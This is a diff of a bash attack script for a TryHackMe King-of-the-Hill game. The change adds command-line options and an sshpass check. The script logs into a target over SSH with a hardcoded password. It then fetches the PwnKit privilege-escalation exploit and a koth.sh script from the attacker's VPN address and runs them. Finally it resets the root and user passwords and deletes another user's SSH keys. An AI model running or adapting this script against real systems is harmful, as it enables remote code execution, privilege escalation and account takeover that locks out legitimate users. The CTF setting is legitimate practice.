@@ -1,17 +1,34 @@
 #!/bin/bash
 
+missing() {
+  if ! command -v "$1" >/dev/null 2>&1; then
+    echo "Install '$1' before running $0 script."
+    exit 1
+  fi
+}
 
-read -p "Your TryHackMe username: " nick
-read -p "Enter the machine IP address: " ip_address
-read -s -p "Enter the new password: " password
+missing sshpass
+
+while getopts ":i:u:p:" opt; do
+  case $opt in
+    i) IP="$OPTARG" ;;
+    u) username="$OPTARG" ;;
+    p) new_password="$OPTARG" ;;
+  esac
+done
+
+if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ]; then
+  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password'"
+  exit 1
+fi
 
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
-ssh -o StrictHostKeychecking=no narrator@"$ip_address" << EOF
+sshpass X8JEETQmf3hkS65f ssh -o StrictHostKeychecking=no narrator@"$IP" << EOF
     cd /tmp && wget http://$vpn/PwnKit && chmod +x PwnKit && ./PwnKit
-    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick" 
-    echo "password" | passwd --stdin root
-    echo "password" | passwd --stdin narrator
-    echo "password" | passwd --stdin tdurden
+    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username" 
+    echo "$new_password" | passwd --stdin root
+    echo "$new_password" | passwd --stdin narrator
+    echo "$new_password" | passwd --stdin tdurden
     rm -rf /home/tdurden/.ssh
 EOF
